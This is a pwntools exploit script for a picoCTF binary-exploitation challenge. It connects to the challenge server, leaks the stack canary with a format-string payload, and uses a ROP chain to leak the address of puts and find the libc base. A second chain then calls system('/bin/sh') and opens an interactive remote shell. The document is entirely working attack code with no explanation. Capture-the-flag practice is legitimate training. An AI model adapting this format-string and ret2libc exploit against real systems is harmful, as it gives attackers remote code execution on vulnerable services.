from pwn import *

elf = context.binary = ELF('./vuln')
libc = ELF('./libc6-i386_2.27-3ubuntu1.6_amd64.so')
context.log_level = 'debug'
context.terminal = 'kitty'

rop = ROP(elf)

number = -3727 
# number = -2495
canary_offset = 135
offset = 512

p = remote("jupiter.challenges.picoctf.org", 57529)
# gdb.attach(p)

p.sendlineafter('?\n', str(number).encode())
p.sendlineafter('Name?', "%{}$p".format(canary_offset).encode())
p.recvuntil('Congrats: ')
canary = int(p.recvline().decode().strip('\n'), 16)
log.info("canary, %#x", canary)

p.sendlineafter('?\n', str(number).encode())

rop.raw(b'A' * offset)
rop.raw(canary)
rop.raw(b'A' * 12)
rop.raw(elf.plt.puts)
rop.raw(elf.sym.win)
rop.raw(elf.got.puts)

print(rop.dump())

p.sendlineafter('Name?', rop.chain())

p.recvuntil('A\n\n')
puts_leak = u32(p.recv(4))
log.info("puts, %#x", puts_leak)

libc.address = puts_leak - libc.sym.puts
log.info("libc, %#x", libc.address)

rop2 = ROP(libc)
rop2.raw(b'A' * offset)
rop2.raw(canary)
rop2.raw(b'A' * 12)
rop2.raw(libc.sym.system)
rop2.raw(libc.sym.exit)
rop2.raw(next(libc.search(b'/bin/sh\x00')))

p.sendlineafter('Name?', rop2.chain())

p.interactive()
